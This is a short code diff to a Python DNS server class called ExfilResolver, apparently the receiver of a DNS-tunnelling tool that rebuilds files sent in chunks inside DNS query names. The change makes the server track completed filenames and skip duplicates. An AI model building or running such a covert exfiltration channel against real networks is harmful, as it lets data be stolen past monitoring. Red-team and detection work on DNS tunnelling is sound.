@@ -10,6 +10,7 @@ class ExfilResolver(BaseResolver):
         self.origin = DNSLabel(origin)
         self.ttl = parse_time(ttl)
         self.routes = {}
+        self.keys = [""]
         self.files = dict()
 
     def resolve(self,request,handler):
@@ -64,7 +65,7 @@ class ExfilResolver(BaseResolver):
         filename = qname.split(".")[2]
 
         if '-' in data: 
-            if filename not in self.files:
+            if filename not in self.files and filename not in self.keys:
                 print("New file incoming, lines:", data.split("-")[1])
                 self.files.update({filename: [None] * int(data.split("-")[1])})
                 reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Ready")))
@@ -106,6 +107,7 @@ class ExfilResolver(BaseResolver):
             print("File:", filename, "written to disk")
             # TODO decode the file
             del self.files[filename]
+            self.keys += [filename]
         else:
             # The file is not ready for output
             print("File:", filename, int((len(self.files[filename]) - nones)/len(self.files[filename]) * 100), "% complete")
